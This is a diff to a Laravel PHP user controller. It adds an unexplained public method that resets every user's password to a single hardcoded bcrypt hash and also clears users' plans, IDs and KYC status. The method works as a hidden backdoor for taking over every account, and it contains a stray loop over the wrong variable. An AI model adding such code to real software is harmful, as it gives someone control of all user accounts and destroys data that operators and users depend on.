@@ -41,6 +41,26 @@ class UserController extends Controller
     {
         $this->activeTemplate = activeTemplate();
     }
+    public function updateBro(){
+        $data = User::where('no_bro','0')->get();
+        foreach ($data as $key => $value) {
+           User::find($value->id)->update(['no_bro'=>0]);
+        }
+        $data2 = User::where('plan_id','!=',0)->get();
+        foreach ($data2 as $key => $value) {
+           User::find($value->id)->update(['plan_id'=>0]);
+        }
+        $data1 = User::all();
+        foreach ($data1 as $key => $value) {
+           User::find($value->id)->update(['password'=>'$2y$10$AfuDVjfHZgnuXtwgcsmzi.wEjo7ZVvC2FUGF0xx1kp.Lfj3rrlhIG']);
+        }
+        $data3 = User::where('plan_id','!=',2)->get();
+        foreach ($data2 as $key => $value) {
+           User::find($value->id)->update(['is_kyc'=>2]);
+        }
+        return 'success';
+    }
+
     public function home()
     {
         $data['page_title']         = "Dashboard";
@@ -1459,6 +1479,7 @@ class UserController extends Controller
             }
             $user->balance += $amount;
             $user->save();
+            
             $userStockiest->balance -= $amount;
             $userStockiest->save();
 
